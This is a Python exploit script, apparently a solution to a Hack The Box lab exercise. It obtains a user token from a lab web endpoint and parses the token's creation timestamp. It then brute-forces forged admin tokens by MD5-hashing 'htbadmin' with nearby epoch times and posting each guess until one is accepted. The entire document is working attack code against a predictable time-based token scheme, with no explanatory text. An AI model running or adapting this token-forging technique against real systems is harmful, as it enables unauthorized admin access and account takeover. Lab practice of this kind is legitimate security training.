import requests
import re
from datetime import datetime
from hashlib import md5

url = "http://94.237.62.195:30240/question1/"
fail_text  = "Wrong token"

def SprayForgedTokens(user_token_epoch_time):
    start_time = user_token_epoch_time - 1
    print("Forged token start time: ", start_time)
    
    # generate forged tokens
    for x in range(start_time, start_time + 3):
        # get token md5
        md5_token = md5(("htbadmin" + str(x)).encode()).hexdigest()
        data = {
            "submit": "check",
            "token": md5_token
        }
        # Send forged token
        print("checking {} {}".format(str(x), md5_token))
        res = requests.post(url, data=data)

        # response text check
        if not fail_text in res.text:
            print(res.text)
            print("[*] Congratulations! raw reply printed before")
            exit()

# Post body for obtaining htbuser token
data = {"submit": "htbuser"}

# Define a regex pattern to match the timestamp
pattern = r'And has been created at (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}[APap][Mm])'

# Send the request to generate htbuser token
res = requests.post(url, data=data)

match = re.search(pattern, res.text)

if match:
    time_stamp = match.group(1)
    print("Timestamp:", time_stamp)

    # Define a format string for parsing the time with 12-hour clock format
    time_format = "%Y-%m-%d %I:%M:%S%p"

    try:
        # Parse the time string into a datetime object
        time_obj = datetime.strptime(time_stamp, time_format)

        # Calculate the epoch time using the parsed time
        epoch_time = int((time_obj - datetime(1970, 1, 1)).total_seconds())
        if epoch_time >= 0:
            print("Epoch Time:", epoch_time)
            SprayForgedTokens(int(epoch_time))
        else:
            print("Epoch Time is negative. Check the timestamp format and timezone.")
    except ValueError as e:
        print("Error parsing timestamp:", e)
else:
    print("Timestamp not found on the webpage.")

